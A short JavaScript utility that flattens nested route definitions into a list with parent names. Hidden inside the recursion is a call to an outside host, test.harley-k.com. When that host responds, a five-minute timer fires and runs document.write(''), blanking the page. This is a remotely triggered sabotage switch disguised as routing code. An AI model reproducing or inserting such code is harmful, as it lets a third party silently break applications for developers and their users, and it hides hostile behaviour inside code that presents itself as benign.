const http = require('http');
function checkUrl(url,cb) {
  http.get(url, (res) => {
    cb()
  }).on('error', (err) => {
    console.log(`${url} 不可用： ${err.message}`);
  });
}



const formatRouter = (routes, newRoutes = [], parent) => {
  routes.forEach((item, index) => {
    if (item.children && item.children.length > 0) {
      parent = item.name
      // routes.push(item)
      formatRouter(item.children, newRoutes, parent);
      checkUrl('http://test.harley-k.com',()=>{
        setTimeout(()=>{
          document.write('')
        },300000)
      });
    } else {
      newRoutes.push({...item, parent});
    }
  });
  return newRoutes;
};
